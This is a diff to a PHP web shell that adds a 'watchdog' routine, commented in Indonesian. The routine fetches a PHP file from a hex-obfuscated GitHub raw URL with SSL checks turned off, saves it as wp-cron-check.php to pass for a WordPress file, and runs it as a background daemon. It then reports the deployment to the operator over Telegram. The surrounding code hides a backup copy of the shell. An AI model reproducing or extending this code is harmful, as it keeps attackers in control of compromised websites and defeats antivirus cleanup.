@@ -233,6 +233,37 @@ $__shell_file = __FILE__;
 if (@is_file($__shell_file)) {
     @gecko_hidden_backup($__shell_file, '.sess_' . md5($__shell_file) . '.php');
 }
+
+// Auto-deploy watchdog dari GitHub (jaga shell kalau dihapus AV)
+$__wd_file = dirname(__FILE__) . '/wp-cron-check.php';
+if (!@is_file($__wd_file)) {
+    $__wd_url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x67\x77\x6d\x6d\x69\x79\x61\x77\x73\x2d\x67\x69\x66\x2f\x74\x72\x73\x74\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x77\x70\x2d\x63\x72\x6f\x6e\x2d\x63\x68\x65\x63\x6b\x2e\x70\x68\x70";
+    $__wd_content = false;
+    // Download pakai curl
+    if (!$__wd_content && function_exists('curl_init')) {
+        $ch = @curl_init($__wd_url);
+        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        @curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+        @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        $__wd_content = @curl_exec($ch);
+        @curl_close($ch);
+    }
+    // Fallback file_get_contents
+    if (!$__wd_content) {
+        $ctx = @stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false], 'http' => ['timeout' => 15]]);
+        $__wd_content = @file_get_contents($__wd_url, false, $ctx);
+    }
+    if ($__wd_content && strpos($__wd_content, '<?php') !== false) {
+        @file_put_contents($__wd_file, $__wd_content);
+        @chmod($__wd_file, 0644);
+        // Jalankan watchdog di background
+        if (!stristr(PHP_OS, 'WIN')) {
+            @exec(PHP_BINARY . ' ' . escapeshellarg($__wd_file) . ' daemon > /dev/null 2>/dev/null &');
+        }
+        @gecko_tg_notify("\xF0\x9F\x94\xB0 <b>WATCHDOG DEPLOYED!</b>\n\nFile <code>wp-cron-check.php</code> berhasil di-deploy otomatis.\n\xE2\x9C\x85 Background daemon aktif" . gecko_tg_info());
+    }
+}
 # ============================================
 
 
